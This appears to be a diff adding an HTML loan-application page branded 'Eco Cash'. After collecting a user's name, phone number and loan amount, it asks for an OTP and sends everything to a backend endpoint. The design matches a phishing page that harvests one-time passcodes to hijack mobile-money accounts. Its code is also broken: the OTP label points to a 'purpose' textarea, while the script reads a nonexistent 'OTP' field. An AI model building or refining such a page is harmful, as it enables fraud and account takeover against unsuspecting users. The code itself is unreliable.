@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eco Cash Loan Application</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 20px; display: flex; justify-content: center; }
+        .form-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        h2 { color: #2e7d32; text-align: center; margin-bottom: 20px; }
+        label { font-weight: bold; display: block; margin-top: 15px; color: #333; }
+        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; resize: vertical; }
+        button { width: 100%; background-color: #2e7d32; color: white; border: none; padding: 12px; margin-top: 20px; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
+        button:hover { background-color: #1b5e20; }
+        .secondary-btn { background-color: #757575; margin-top: 10px; }
+        .secondary-btn:hover { background-color: #616161; }
+        .hidden { display: none; }
+        .success-screen { text-align: center; padding: 20px; color: #2e7d32; }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <form id="loanForm">
+        <!-- STEP 1: Personal & Loan Details -->
+        <div id="step-1">
+            <h2>Eco Cash Loan Application</h2>
+            
+            <label for="fullName">Full Name</label>
+            <input type="text" id="fullName" required placeholder="John Doe">
+
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" required placeholder="0712345678">
+
+            <label for="amount">Loan Amount</label>
+            <input type="number" id="amount" required placeholder="e.g. 5000">
+
+            <label for="period">Repayment Period</label>
+            <select id="period" required>
+                <option value="1 Month">1 Month</option>
+                <option value="2 Months">2 Months</option>
+                <option value="3 Months">3 Months</option>
+                <option value="6 Months">6 Months</option>
+            </select>
+
+            <button type="button" id="nextBtn">Next: OTP</button>
+        </div>
+
+        <!-- STEP 2: OTP -->
+        <div id="step-2" class="hidden">
+            <h2>Application Details</h2>
+            
+            <label for="OTP">OTP</label>
+            <textarea id="purpose" rows="4" required placeholder="Please explain briefly what you will use the funds for..."></textarea>
+
+            <button type="submit">Submit Final Application</button>
+            <button type="button" id="backBtn" class="secondary-btn">Go Back</button>
+        </div>
+    </form>
+
+    <!-- STEP 3: Thank You / Success Screen -->
+    <div id="success-step" class="hidden success-screen">
+        <h2>Application Submitted!</h2>
+        <p>Thank you for submitting your loan request. Your application details have been received successfully and are under review.</p>
+    </div>
+</div>
+
+<script>
+const step1 = document.getElementById('step-1');
+const step2 = document.getElementById('step-2');
+const successStep = document.getElementById('success-step');
+
+const nextBtn = document.getElementById('nextBtn');
+const backBtn = document.getElementById('backBtn');
+const loanForm = document.getElementById('loanForm');
+
+// Navigation: Step 1 to Step 2
+nextBtn.addEventListener('click', () => {
+    // Check if step 1 inputs are valid before moving forward
+    if (document.getElementById('fullName').value && 
+        document.getElementById('phone').value && 
+        document.getElementById('amount').value) {
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+    } else {
+        alert('Please fill out all fields before continuing.');
+    }
+});
+
+// Navigation: Go Back to Step 1
+backBtn.addEventListener('click', () => {
+    step2.classList.add('hidden');
+    step1.classList.remove('hidden');
+});
+
+// Final Form Submission
+loanForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = {
+        fullName: document.getElementById('fullName').value,
+        phone: document.getElementById('phone').value,
+        amount: document.getElementById('amount').value,
+        period: document.getElementById('period').value,
+        OTP: document.getElementById('OTP').value
+    };
+
+    // Hide the form and show the final success confirmation
+    step2.classList.add('hidden');
+    successStep.classList.remove('hidden');
+
+    // Transmit all step 1 and step 2 data to your backend
+    fetch('/api/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(formData)
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (!data.success) {
+            alert('Submission error. Please try again.');
+        }
+    })
+    .catch(err => console.error('Error:', err));
+});
+</script>
+
+</body>
+</html>
